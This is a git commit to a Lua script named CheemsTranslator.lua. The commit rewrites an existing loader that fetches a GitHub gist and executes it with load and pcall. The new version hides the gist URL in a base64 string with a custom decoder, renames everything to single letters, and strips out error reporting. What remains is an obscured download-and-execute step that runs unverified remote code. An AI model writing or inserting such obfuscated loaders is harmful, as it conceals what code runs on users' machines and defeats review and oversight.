e4705f222db2057608d8d779b69a055258d4fd95
Raihan Kabir Choudhury <raihankabirchoudhury@gmail.com>
2026-05-18 03:00:03 +0530

    Update CheemsTranslator.lua

--- CheemsTranslator.lua
+++ CheemsTranslator.lua
@@ -1,4 +1,70 @@
-local function HttpGet(url)
+local a =
+"aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9kZXYta2FiaXIvMjI4N2JmNDBiY2VkZWRjNGM2NmVkZmE0Y2M0MmUyMzkvcmF3LzU0OWE2NWI2ZmEzNjBjYTE1OGEwMTBmNzQ2ZDcyNDI4MWZlMTRkYTkvTWFpbi5sdWE="
+
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+
+local function c(data)
+
+    data =
+        string.gsub(
+            data,
+            '[^'..b..'=]',
+            ''
+        )
+
+    return (
+        data:gsub('.', function(x)
+
+            if x == '=' then
+                return ''
+            end
+
+            local r,f='',
+            (b:find(x)-1)
+
+            for i=6,1,-1 do
+
+                r=r..(
+                    f%2^i-f%2^(i-1)>0
+                    and '1'
+                    or '0'
+                )
+
+            end
+
+            return r
+
+        end)
+
+        :gsub(
+            '%d%d%d?%d?%d?%d?%d?%d?',
+            function(x)
+
+                if #x ~= 8 then
+                    return ''
+                end
+
+                local c=0
+
+                for i=1,8 do
+
+                    c=c+(
+                        x:sub(i,i)=='1'
+                        and 2^(8-i)
+                        or 0
+                    )
+
+                end
+
+                return string.char(c)
+
+            end
+        )
+    )
+
+end
+
+local function d(url)
 
     local curl =
         Curl.Easy()
@@ -27,36 +93,19 @@ local function HttpGet(url)
     return response
 end
 
-local SCRIPT_URL =
-"https://gist.githubusercontent.com/dev-kabir/2287bf40bcededc4c66edfa4cc42e239/raw/549a65b6fa360ca158a010f746d724281fe14da9/Main.lua"
+local e =
+    c(a)
 
-local script =
-    HttpGet(
-        SCRIPT_URL
-    )
+local f =
+    d(e)
 
-if script then
+if f then
 
-    local func =
-        load(script)
+    local g =
+        load(f)
 
-    if func then
-
-        local ok, err =
-            pcall(func)
-
-        if not ok then
-
-            GUI.AddToast(
-                "",
-                "Loader Error",
-                5000
-            )
-
-            Logger.LogError(err)
-
-        end
-
+    if g then
+        pcall(g)
     end
 
 end
